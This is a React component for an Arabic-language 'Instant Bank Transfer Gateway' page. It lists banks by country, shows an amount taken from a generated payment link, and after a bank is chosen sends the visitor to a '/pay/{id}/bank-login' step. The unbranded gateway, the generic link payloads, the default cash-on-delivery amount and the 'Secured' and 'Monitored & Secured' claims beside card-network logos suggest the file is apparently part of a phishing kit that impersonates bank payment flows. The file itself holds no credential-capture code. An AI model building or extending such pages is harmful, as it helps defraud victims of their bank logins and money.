import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Landmark, ArrowRight, ShieldCheck, Building2, Search, CheckCircle2, ChevronLeft, Globe, Lock } from "lucide-react";
import { getBanksByCountry } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { Input } from "@/components/ui/input";
import BackButton from "@/components/BackButton";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLinkData(id);
  const updateLink = useUpdateLink();
  const [searchTerm, setSearchTerm] = useState("");
  
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(selectedCountry);
  const banks = getBanksByCountry(selectedCountry);
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const filteredBanks = banks.filter(bank => {
    const nameMatch = bank.name ? bank.name.toLowerCase().includes(searchTerm.toLowerCase()) : false;
    const nameArMatch = bank.nameAr ? bank.nameAr.includes(searchTerm) : false;
    return nameMatch || nameArMatch;
  });

  const handleBankSelect = async (bankId: string) => {
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: { ...linkData?.payload, selectedBank: bankId }
        });
      }
      const query = new URLSearchParams(window.location.search);
      query.set('bank', bankId);
      navigate(`/pay/${id}/bank-login?${query.toString()}`);
    } catch (error) {
      console.error("Error updating bank selection:", error);
    }
  };

  if (isLoading || !linkData) return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
    </div>
  );

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-arabic" dir="rtl">
      <PaymentMetaTags serviceName="اختيار البنك" title="اختر البنك الخاص بك" />

      <header className="bg-white border-b h-16 sm:h-20 flex items-center sticky top-0 z-50 shadow-sm px-4">
        <div className="container mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="w-10 h-10 bg-primary/10 rounded-xl flex items-center justify-center text-primary">
              <Building2 className="w-6 h-6" />
            </div>
            <div>
              <h1 className="text-lg font-black text-gray-900 leading-none">بوابة التحويل البنكي</h1>
              <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-1">Instant Bank Transfer Gateway</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
             <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-slate-50 border text-[10px] font-bold text-slate-500">
                <Globe className="w-3.5 h-3.5" />
                <span>English</span>
             </div>
             <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-bold">
                <Lock className="w-3.5 h-3.5" />
                <span>Secured</span>
             </div>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-10 max-w-5xl">
        <div className="grid lg:grid-cols-3 gap-10 items-start">

           {/* Left Side: Instructions & Search */}
           <div className="lg:col-span-1 space-y-8">
              <div className="space-y-2">
                 <h2 className="text-3xl font-black text-slate-900 tracking-tight">حدد البنك الخاص بك</h2>
                 <p className="text-sm font-bold text-slate-500 leading-relaxed">
                    يرجى اختيار البنك الذي تملك فيه حساباً نشطاً لإتمام عملية الدفع الفورية.
                 </p>
              </div>

              <div
                className="p-8 rounded-[2.5rem] text-white shadow-xl relative overflow-hidden"
                style={{ background: 'linear-gradient(135deg, #1e293b, #0f172a)' }}
              >
                 <p className="text-[10px] font-black text-slate-400 uppercase tracking-[0.2em] mb-3">المبلغ المطلوب سداده</p>
                 <div className="flex items-baseline gap-2 mb-6">
                    <span className="text-4xl font-black">{formattedAmount}</span>
                 </div>
                 <div className="flex items-center gap-2 text-[10px] font-bold text-green-400 bg-green-400/10 px-3 py-1.5 rounded-full border border-green-400/20 w-fit">
                    <ShieldCheck className="w-3.5 h-3.5" />
                    <span>عملية دفع محمية ومؤمنة</span>
                 </div>
                 <Landmark className="absolute -bottom-6 -right-6 w-32 h-32 opacity-5 -rotate-12" />
              </div>

              <div className="relative group">
                <Input
                  type="text"
                  placeholder="ابحث عن البنك..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="h-16 pr-14 rounded-2xl border-2 border-slate-200 focus:border-primary focus:ring-4 focus:ring-primary/5 transition-all font-black text-lg shadow-sm"
                />
                <Search className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-slate-300 group-focus-within:text-primary transition-colors" />
              </div>
           </div>

           {/* Right Side: Bank Grid */}
           <div className="lg:col-span-2">
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 sm:gap-6">
                {filteredBanks.map((bank) => (
                  <button
                    key={bank.id}
                    onClick={() => handleBankSelect(bank.id)}
                    className="group relative bg-white p-6 rounded-[2.5rem] border-2 border-slate-50 hover:border-primary hover:shadow-2xl hover:shadow-primary/10 transition-all duration-500 flex flex-col items-center gap-5 text-center overflow-hidden active:scale-95"
                  >
                    <div className="absolute top-0 right-0 w-16 h-16 bg-primary/5 rounded-bl-[2.5rem] opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                      <CheckCircle2 className="w-7 h-7 text-primary" />
                    </div>

                    <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-3xl bg-slate-50 p-4 flex items-center justify-center group-hover:bg-white group-hover:scale-110 transition-all duration-500 shadow-sm border border-slate-50">
                      <img src={bank.logo} alt={bank.name} className="max-w-full max-h-full object-contain" />
                    </div>

                    <div className="space-y-1">
                      <h3 className="font-black text-slate-900 group-hover:text-primary transition-colors">{bank.nameAr}</h3>
                      <p className="text-[9px] font-bold text-slate-400 uppercase tracking-tighter">{bank.name}</p>
                    </div>

                    <div className="mt-2 w-full h-12 rounded-2xl bg-slate-50 group-hover:bg-primary group-hover:text-white flex items-center justify-center gap-2 text-[10px] font-black transition-all shadow-inner">
                      <span>اختيار البنك</span>
                      <ChevronLeft className="w-4 h-4" />
                    </div>
                  </button>
                ))}
              </div>

              {filteredBanks.length === 0 && (
                <Card className="p-16 text-center rounded-[3rem] border-4 border-dashed border-slate-100 bg-white shadow-sm">
                  <div className="w-24 h-24 bg-slate-50 rounded-full flex items-center justify-center mx-auto mb-6 text-slate-200">
                    <Building2 className="w-12 h-12" />
                  </div>
                  <h3 className="text-2xl font-black text-slate-900 mb-2">عذراً، لم نجد البنك المطلوب</h3>
                  <p className="text-slate-400 font-bold uppercase tracking-widest text-[10px]">No Banks Found Matching Your Search</p>
                </Card>
              )}
           </div>
        </div>
      </main>

      <footer className="py-10 border-t bg-white">
        <div className="container mx-auto px-4 text-center space-y-6">
          <div className="flex items-center justify-center gap-10 opacity-30 grayscale h-6">
             <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
             <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
             <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
          </div>
          <div className="flex items-center justify-center gap-3 text-slate-400">
             <ShieldCheck className="w-5 h-5 text-primary" />
             <p className="text-[10px] font-bold uppercase tracking-[0.2em]">All Transactions are Monitored & Secured</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PaymentBankSelector;
